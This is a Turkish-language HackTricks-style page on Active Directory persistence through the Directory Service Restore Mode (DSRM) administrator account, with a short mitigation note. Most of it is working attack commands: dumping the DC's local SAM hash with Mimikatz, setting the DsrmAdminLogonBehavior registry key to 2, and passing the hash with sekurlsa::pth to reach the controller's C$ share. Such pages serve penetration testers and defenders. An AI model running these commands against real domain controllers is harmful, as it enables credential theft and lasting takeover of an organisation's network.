# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Her **DC** içerisinde bir **local administrator** hesabı bulunur. Bu makinede admin ayrıcalıklarına sahip olarak mimikatz kullanıp **local Administrator hash** değerini **dump** edebilirsiniz. Ardından bu parolayı **activate** etmek için bir registry değerini değiştirerek bu local Administrator kullanıcısına uzaktan erişebilirsiniz.\
Öncelikle DC içerisindeki **local Administrator** kullanıcısının **hash** değerini **dump** etmemiz gerekiyor:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Ardından bu hesabın çalışıp çalışmayacağını kontrol etmemiz gerekir; kayıt defteri anahtarının değeri "0" ise veya mevcut değilse, **"2" olarak ayarlamanız** gerekir:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Ardından, bir PTH kullanarak **C$ içeriğini listeleyebilir veya hatta bir shell elde edebilirsiniz**. Bu hash'i bellekte kullanarak (PTH için) yeni bir powershell oturumu oluştururken **kullanılan "domain" yalnızca DC makinesinin adıdır**:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Bu konu hakkında daha fazla bilgi için: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) ve [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Azaltma

- Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` oluşturma/değiştirme denetimi

## Referanslar

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
